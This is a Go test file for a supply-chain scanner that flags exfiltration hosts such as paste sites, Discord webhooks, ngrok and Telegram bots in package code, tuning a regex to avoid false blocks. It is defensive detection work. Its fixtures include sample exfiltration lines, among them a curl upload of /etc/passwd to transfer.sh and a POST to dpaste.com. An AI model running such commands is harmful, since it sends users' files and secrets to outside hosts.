package iocscan

import "testing"

// TestHostBoundary_RejectsInWordMatches pins the false blocks that the
// unanchored bare-hostname alternatives in exfilHostRE caused. Each of
// these is real source shape from a top package or an obvious analogue;
// prompt_toolkit's "BracketedPaste." is the one that actually appeared
// on the measured false-block list (2026-08-24, 7/860).
//
// A real exfil host is never preceded by a letter or digit, because that
// makes it a different host. xdpaste.com is not dpaste.com.
func TestHostBoundary_RejectsInWordMatches(t *testing.T) {
	for _, tc := range []struct{ name, body string }{
		{"prompt_toolkit BracketedPaste", "yield KeyPress(Keys.BracketedPaste.value)"},
		{"profile.io path", "const p = require('./profile.io/index')"},
		{"fileTransfer.sh", "sh scripts/fileTransfer.sh --now"},
		{"toast.live import", "import toast.live as toaster"},
		{"roast.pro call", "return roast.pro(x)"},
		{"logofile.io var", "var logofile.io = 1"},
		{"yoshi.at", "yoshi.at(0)"},
		{"myGhostbin", "myGhostbin.render()"},
		// litellm's docstring deliberately neuters the example webhook by
		// writing "nothooks". That is a DIFFERENT host from hooks.slack.com,
		// and it blocked litellm in the benign corpus. It also blocked
		// litellm@1.82.7 in the DataDog malware corpus — on evidence that is
		// identical boilerplate in clean releases, so the "catch" was
		// coincidental, not detection. See the A/B in
		// docs/launch/fp-rate-measurement-2026-08.md.
		{"litellm nothooks placeholder", `'budget_alerts': 'https://nothooks.slack.com/services/T00000000/B00000000/XXXX'`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if m := findExfilHost(tc.body); m != "" {
				t.Errorf("false block: %q matched %q — an indicator inside a longer word is a different host, "+
					"and every one of these refuses a developer's install", tc.body, m)
			}
		})
	}
}

// TestHostBoundary_KeepsRealHosts is the other half, and the one that
// matters for catch rate: narrowing the pattern must not drop a genuine
// sink. Real malware writes the host after a scheme, a quote, or
// whitespace — every shape below stays caught.
func TestHostBoundary_KeepsRealHosts(t *testing.T) {
	for _, tc := range []struct{ name, body, want string }{
		{"scheme", "r = requests.post('https://dpaste.com/abc')", "dpaste."},
		{"bare quote", `url = "dpaste.org/x"`, "dpaste."},
		{"whitespace", "curl transfer.sh -T /etc/passwd", "transfer.sh"},
		{"subdomain dot", "https://sub.dpaste.org/x", "dpaste."},
		{"start of file", "dpaste.com/raw", "dpaste."},
		{"file.io with slash", "fetch('https://file.io/abc')", "file.io/"},
		{"gofile", "https://gofile.io/d/x", "gofile.io"},
		{"oast", "https://oast.pro/cb", "oast.pro"},
		{"ghostbin", "post('https://ghostbin.co/paste')", "ghostbin."},
		{"discord webhook", "https://discord.com/api/webhooks/1/2", "discord.com/api/webhooks/"},
		{"telegram", "API = 'https://api.telegram.org/bot'", "api.telegram.org/bot"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if m := findExfilHost(tc.body); m == "" {
				t.Errorf("MISSED a real exfil sink in %q — the boundary fix must not cost catch rate", tc.body)
			}
		})
	}
}

// TestHostBoundary_LeadingDotAlternativesSurvive is the carve-out that
// is easiest to get wrong. `\.ngrok\.io` and `\.interactsh\.com` consume
// the separating dot on purpose so they attach to any subdomain, which
// means the character before the match IS alphanumeric by design. A
// naive "reject if preceded by a letter" rule deletes both detections.
func TestHostBoundary_LeadingDotAlternativesSurvive(t *testing.T) {
	for _, body := range []string{
		`url = "https://foo.ngrok.io/cb"`,
		`u := "https://abc123.ngrok-free.app/x"`,
		`h = "payload.oob.interactsh.com"`,
	} {
		if m := findExfilHost(body); m == "" {
			t.Errorf("leading-dot alternative lost its match in %q — these anchor their own boundary", body)
		}
	}
}

// TestHostBoundary_RejectedMatchDoesNotBlindTheScan: a file may mention
// an in-word lookalike before it embeds a genuine sink. Testing only the
// FIRST regex match would let the lookalike shadow the real one, turning
// a false-positive fix into a false NEGATIVE.
func TestHostBoundary_RejectedMatchDoesNotBlindTheScan(t *testing.T) {
	body := "the event into a BracketedPaste.\n// ... later ...\nrequests.post('https://dpaste.com/steal')\n"
	m := findExfilHost(body)
	if m == "" {
		t.Fatal("a genuine sink after a rejected lookalike must still be found")
	}
}

// TestHostBoundary_ScanStillBlocks wires the above through the public
// entry point, so the fix is pinned at the boundary callers actually use.
func TestHostBoundary_ScanStillBlocks(t *testing.T) {
	// Shipping code with a real sink: dispositive, not weak.
	got := Scan(map[string][]byte{
		"pkg/send.go": []byte(`http.Post("https://dpaste.com/x", nil)`),
	})
	if !got.Detected || got.Kind != "exfil_host" || got.Weak {
		t.Fatalf("real sink in shipping code must be a hard exfil_host hit, got %+v", got)
	}
	// The prompt_toolkit shape: no hit at all now.
	got = Scan(map[string][]byte{
		"prompt_toolkit/input/win32.py": []byte("yield KeyPress(Keys.BracketedPaste.value)\n"),
	})
	if got.Detected {
		t.Fatalf("BracketedPaste must not be an IOC, got %+v", got)
	}
}
